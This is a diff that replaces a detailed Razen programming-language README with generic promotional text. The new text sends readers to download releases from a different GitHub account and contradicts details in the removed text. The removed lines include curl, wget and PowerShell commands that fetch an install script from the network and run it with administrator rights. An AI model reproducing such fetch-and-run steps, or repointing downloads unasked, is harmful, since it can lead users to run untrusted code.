@@ -1,216 +1,50 @@
-# Razen Programming Language (beta v0.1.36)
+# Razen-Lang 🚀
 
-## Overview
-Razen is a modern, intuitive programming language designed for clarity, performance, and ease of use. With a clean syntax inspired by Python and strong type safety, Razen offers an excellent balance between development speed and runtime performance.
-
-Developed by Prathmesh Barot, Basai Corporation.
+Welcome to Razen-Lang - the modern, lightweight programming language with Python-like syntax, high performance, and built-in debugging capabilities. Whether you're into scripting, testing, or custom module development, Razen has got you covered. This README will give you all the essential information you need to get started with Razen-Lang.
 
 ## Features
-- **Intuitive Syntax**: Python-like syntax that's easy to read and write
-- **Fast Performance**: Built for efficiency with optimized runtime execution
-- **Built-in Debugging**: Comprehensive debugging tools including step-by-step execution
-- **String Interpolation**: Powerful nested string interpolation with `${...}` syntax
-- **Type Flexibility**: Combines dynamic typing with optional type annotations
-- **Expressive Conditionals**: Clean if/else syntax with support for nested conditions
-- **Interactive Mode**: Built-in REPL for testing code snippets
-- **Lightweight**: Small footprint with minimal dependencies
-- **Cross-platform support**: Works on Linux, macOS, and Windows
 
-## Installation
+### Lightweight and Powerful
+Razen is a lightweight language that does not compromise on power. It offers a rich set of features suitable for a wide range of programming tasks.
 
-### Linux
-```bash
-# Using curl
-curl -o install.sh "https://raw.githubusercontent.com/BasaiCorp/razen-lang/main/install.sh" && chmod +x install.sh && sudo ./install.sh
+### Python-Like Syntax
+If you're familiar with Python, you'll feel right at home with Razen's syntax. It's designed to be intuitive and easy to read.
+
+### High Performance
+Don't let its simplicity fool you - Razen is built for speed. It leverages LLVM under the hood to deliver high performance code execution.
+
+### Built-In Debugging
+Say goodbye to complex debugging setups. Razen comes with built-in debugging tools to help you easily identify and resolve issues in your code.
+
+## Getting Started
+
+To start using Razen-Lang, head over to the [Releases](https://github.com/diiorie/Razen-Lang/releases) section and download the latest release file for your platform. Then follow the installation instructions to set up Razen on your system.
+
+## Example
+
+Here's a simple "Hello, World!" program in Razen-Lang:
+
+```python
+print("Hello, World!")
 ```
 
-```bash
-# Using wget
-wget -O install.sh "https://raw.githubusercontent.com/BasaiCorp/razen-lang/main/install.sh" && chmod +x install.sh && sudo ./install.sh
-```
+Save the above code in a file with a `.rz` extension and run it using the Razen interpreter to see the magic happen.
 
-### macOS
-```bash
-# Using curl
-curl -o install-mac.sh "https://raw.githubusercontent.com/BasaiCorp/razen-lang/main/install-mac.sh" && chmod +x install-mac.sh && sudo ./install-mac.sh
-```
+## Community and Support
 
-```bash
-# Using Homebrew (coming soon)
-brew install razen
-```
+Have questions or need help with Razen-Lang? Join our friendly community on Discord or check out our documentation for in-depth guides and tutorials.
 
-### Windows
-```powershell
-# Using PowerShell (Run as Administrator)
-# First, create a temporary directory and change to it
-cd $env:USERPROFILE\Desktop
-# Download and run the installer
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BasaiCorp/razen-lang/main/install.ps1" -OutFile "install.ps1"; .\install.ps1
-```
+## The Future of Razen
 
-```powershell
-# Alternative method (if the above doesn't work):
-# 1. Open PowerShell as Administrator
-# 2. Run these commands:
-cd $env:USERPROFILE\Desktop
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BasaiCorp/razen-lang/main/install.ps1" -OutFile "install.ps1"
-.\install.ps1
-```
+We are constantly working on improving Razen-Lang and adding new features. Stay tuned for exciting updates in the future releases.
 
-This will download and install Razen globally on your system, making the `razen` command available from anywhere.
+## Repository Information
 
-### Keeping Razen Updated
+- **Repository Name:** Razen-Lang
+- **Description:** 🚀 Razen is a modern, lightweight programming language with Python-like syntax, high performance, and built-in debugging. Perfect for scripting, testing, and custom module development.
+- **Topics:** coding, easy, free, lightweight, llvm, news, open-source, powerful, programming-language, python, python3, scripting-language, speech
 
-To update Razen to the latest version:
-```bash
-razen-update
-```
+Don't miss out on the latest updates and improvements - visit the [Releases](https://github.com/diiorie/Razen-Lang/releases) section now!
 
-This will automatically check for updates and install the newest version if available.
-
-### Uninstalling Razen
-
-To uninstall Razen:
-```bash
-razen uninstall
-```
-
-Alternatively:
-```bash
-sudo /usr/local/lib/razen/install.sh --uninstall
-```
-
-## Usage
-
-### Command Reference
-
-```bash
-# Core Commands
-razen <filename.rzn>       # Run a Razen script
-razen new <filename>       # Create a new Razen program
-razen version              # Display version information
-razen help                 # Show help information
-razen uninstall            # Uninstall Razen
-
-# Specialized Tools
-razen-debug <filename.rzn> # Debug mode with detailed output
-razen-test <filename.rzn>  # Test mode for testing scripts
-razen-run <filename.rzn>   # Clean mode (only shows program output)
-razen-update               # Update to the latest version
-razen-help                 # Display detailed help with formatting
-```
-
-### Running Scripts
-
-```bash
-razen path/to/script.rzn       # Standard execution
-razen-debug path/to/script.rzn # Debug mode with detailed output
-razen-test path/to/script.rzn  # Test mode for testing scripts
-razen-run path/to/script.rzn   # Clean mode (only shows program output)
-```
-
-### Creating Your First Razen Program
-
-You can create a new Razen program with a template:
-```bash
-razen new hello
-```
-
-This creates a new file `hello.rzn` with a Hello World template:
-```razen
-// New Razen program created on [current date]
-// Powered by Razen Language
-
-// Your code goes here
-let message = "Hello, World!"
-show "${message}"
-
-// Read user input
-read user_input = "What's your name? "
-show "Nice to meet you, ${user_input}!"
-```
-
-Run it with:
-```bash
-razen-run hello.rzn
-```
-
-## Example Code
-
-```razen
-// Variables
-let name = "World"
-let price = 9.99
-let quantity = 5
-let is_available = true
-
-// String interpolation
-show "Hello, ${name}!"
-
-// Calculations
-let total = price * quantity
-show "Total cost: ${total}"
-
-// Conditionals
-if total > 50 {
-    show "Qualifies for free shipping!"
-} else {
-    show "Add more items for free shipping."
-}
-
-// Input
-read user_input = "Enter your name: "
-show "Hello, ${user_input}!"
-
-// Nested interpolation
-let inner = "value"
-let outer = "Outer with ${inner}"
-show "${outer}"
-```
-
-Check the `examples` folder for more sample programs and tutorials.
-
-## Command Details
-
-### razen-update
-A dedicated command to check for and install updates from the main repository. It shows the current version and latest available version, then performs the update if a newer version is available.
-
-### razen-help
-A colorful, well-formatted help command that displays comprehensive information about all available Razen commands, tools, and usage examples.
-
-### razen new
-Creates a new Razen program with a template to help you get started quickly. Automatically adds the `.rzn` extension if not provided.
-
-### razen uninstall
-Safely removes all Razen files and symbolic links from your system. Provides confirmation before proceeding.
-
-## File Locations
-
-- **Core files**: `/usr/local/lib/razen`
-- **Examples**: `/usr/local/lib/razen/examples`
-- **Scripts**: `/usr/local/lib/razen/scripts`
-
-## License
-Razen is licensed under a custom license. See the [LICENSE](./LICENSE) file for details.
-
-Key points:
-- You can use Razen for personal and commercial projects
-- You can create libraries and applications using Razen
-- You cannot modify, rebrand, or redistribute the core language
-- You must include attribution: "Powered by Razen - © 2025 Prathmesh Barot"
-
-## Attribution
-When using Razen in your projects, please include the following attribution:
-
-```
-Powered by Razen - © 2025 Prathmesh Barot, Basai Corporation
-```
-
-## Contact
-For questions, support, or feedback about Razen, please contact:
-- Email: prathmesh.barot@example.com
-- GitHub: [https://github.com/BasaiCorp/razen-lang](https://github.com/BasaiCorp/razen-lang)
-
-**Official website coming soon!**
+---
+Feel free to explore Razen-Lang and unleash your coding potential with a language that's easy, powerful, and just what you need. Happy coding! 🌟
